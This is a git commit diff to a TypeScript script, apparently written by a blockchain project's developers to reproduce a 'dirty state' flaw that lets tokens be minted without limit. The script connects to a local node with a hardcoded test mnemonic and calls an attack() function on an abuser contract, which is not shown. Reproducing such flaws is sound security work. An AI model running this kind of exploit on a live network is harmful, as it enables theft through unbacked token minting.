c6aec306c393ed2609d1e4b13658a58b2e701eed
Kevin Yang <5478483+k-yang@users.noreply.github.com>
2024-10-23 16:49:04 -0700

    feat(dirty-state): create another attack vector where tokens could be infinitely minted

--- scripts/dirty_state_attack2/attack.ts
+++ scripts/dirty_state_attack2/attack.ts
@@ -1,5 +1,5 @@
 import { HDNodeWallet, JsonRpcProvider } from "ethers";
-import { DirtyStateAbuser__factory } from "../../typechain-types";
+import { DirtyStateAbuser2__factory } from "../../typechain-types";
 
 // connects to local node
 const jsonRpcProvider = new JsonRpcProvider("http://localhost:8545");
@@ -8,15 +8,21 @@ const jsonRpcProvider = new JsonRpcProvider("http://localhost:8545");
 const mnemonic = "guard cream sadness conduct invite crumble clock pudding hole grit liar hotel maid produce squeeze return argue turtle know drive eight casino maze host"
 const owner = HDNodeWallet.fromPhrase(mnemonic, "", "m/44'/118'/0'/0/0").connect(jsonRpcProvider)
 
-const attackContract = "0xFfa7dFF969218b50492c05bF41Ca3583D5D16Bc8"
+// get command line arguments
+const COMMAND_LINE_ARGS = process.argv.slice(2)
+const attackContract = COMMAND_LINE_ARGS[0]
+const sendRecipient = COMMAND_LINE_ARGS[1]
+const bech32Recipient = COMMAND_LINE_ARGS[2]
 
 async function main() {
-  const contract = DirtyStateAbuser__factory.connect(attackContract, owner)
+  const contract = DirtyStateAbuser2__factory.connect(attackContract, owner)
   console.log("contract address: ", await contract.getAddress())
 
   // transfer 100 tokens to another address
-  const counter = await contract.counter()
-  console.log("counter: ", counter)
+  const txResponse = await contract.attack(sendRecipient, bech32Recipient)
+  console.log("tx: ", txResponse)
+  const txReceipt = await jsonRpcProvider.waitForTransaction(txResponse.hash)
+  console.log("txReceipt: ", txReceipt)
 }
 
 main()
